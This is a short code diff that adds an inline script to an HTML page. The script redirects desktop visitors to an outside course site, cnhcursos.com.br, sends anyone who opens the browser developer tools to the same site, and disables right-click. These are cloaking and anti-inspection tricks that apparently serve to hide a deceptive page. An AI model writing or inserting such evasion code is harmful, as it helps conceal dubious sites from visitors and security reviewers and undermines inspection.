@@ -31,6 +31,26 @@ src="https://www.facebook.com/tr?id=4327697327497010&ev=PageView&noscript=1"
   defer
 ></script>
         
+        <script>
+(function() {
+    function isMobile() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+    if (!isMobile()) {
+        window.location.href = "https://cnhcursos.com.br/";
+    }
+    document.addEventListener("keydown", function(event) {
+        if (event.key === "F12" || (event.ctrlKey && event.shiftKey && event.key === "I")) {
+            event.preventDefault();
+            window.location.href = "https://cnhcursos.com.br/";
+        }
+    });
+    document.addEventListener("contextmenu", function(event) {
+        event.preventDefault();
+    });
+})();
+</script>
+        
     <style data-vite-theme="" data-inject-first="">
         :root {
             --background: 0 0% 100%;
